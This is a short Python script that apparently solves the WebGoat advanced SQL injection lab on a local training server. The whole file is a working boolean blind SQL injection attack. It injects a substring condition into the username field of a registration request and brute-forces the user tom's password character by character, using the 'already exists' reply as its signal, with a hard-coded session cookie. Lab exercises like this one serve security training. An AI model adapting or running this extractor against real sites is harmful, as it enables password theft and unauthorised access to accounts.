import requests


def main():
    url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"

    webgoat_session_id = "IR76lHj3_iQSw3b511dmTKIfqq8gae9siwo3JRzU"
    header = {
        "Cookie": "JSESSIONID=" + webgoat_session_id,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "http://localhost:8080/WebGoat/start.mvc",
        "Origin": "http://localhost:8080",
        "Host": "localhost:8080",
        "Content-Length": "126",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
        "sec-ch-ua-platform": "macOS",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    password = ""

    for length in range(1, 25):
        for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            params = "username_reg=tom'+AND+substring(password%2C1%2C" + str(
                length) + ")%3D'" + password + letter + "&email_reg=test%40test.test&password_reg=test&confirm_password_reg=test"
            r = requests.put(url, headers=header, data=params)
            print("et")
            if "already exists" in r.text:
                password += letter
                print(password)
                break
            else:
                continue
    print("")
    print("")
    print("Password found: " + password)

main()

# if __name__ == "__main__":
#     main()